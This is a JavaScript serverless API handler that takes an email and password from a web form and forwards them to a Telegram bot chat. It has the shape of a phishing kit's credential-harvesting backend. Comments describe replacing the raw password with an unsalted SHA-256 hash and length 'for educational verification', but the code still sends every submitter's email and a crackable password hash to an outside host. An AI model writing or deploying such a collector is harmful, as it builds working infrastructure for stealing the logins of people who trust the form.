export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).json({ message: "Method not allowed" });

  const { email, password } = req.body || {};
  if (!email || !password) return res.status(400).json({ message: "Missing fields" });

  // SAFER: do not transmit or store raw passwords. Send a one-way hash + length for educational verification.
  // If your assignment truly requires seeing "a secret" reach Telegram, use a lab-only dummy value, not real credentials.
  const encoder = new TextEncoder();
  const data = encoder.encode(password);
  const hashBuffer = await crypto.subtle.digest("SHA-256", data);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  const passwordHash = hashArray.map(b => b.toString(16).padStart(2, "0")).join("");

  const message =
    `New Form Submission\n` +
    `Email: ${email}\n` +
    `Password SHA-256: ${passwordHash}\n` +
    `Password length: ${password.length}\n` +
    `Time: ${new Date().toISOString()}`;

  const token = process.env.TG_BOT_TOKEN;
  const chatId = process.env.TG_CHAT_ID;

  if (!token || !chatId) {
    console.log("ENV CHECK:", { TG_BOT_TOKEN: !!token, TG_CHAT_ID: !!chatId });
    return res.status(500).json({ message: "Missing TG_BOT_TOKEN or TG_CHAT_ID env vars" });
  }

  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  try {
    const tgRes = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message })
    });

    const tgData = await tgRes.json();
    console.log("Telegram response:", tgData);

    if (!tgRes.ok || tgData.ok === false) {
      return res.status(502).json({ message: "Telegram send failed", details: tgData });
    }

    return res.status(200).json({ message: "Sent to Telegram" });
  } catch (err) {
    console.error("Telegram error:", err);
    return res.status(500).json({ message: "Server error sending to Telegram" });
  }
}
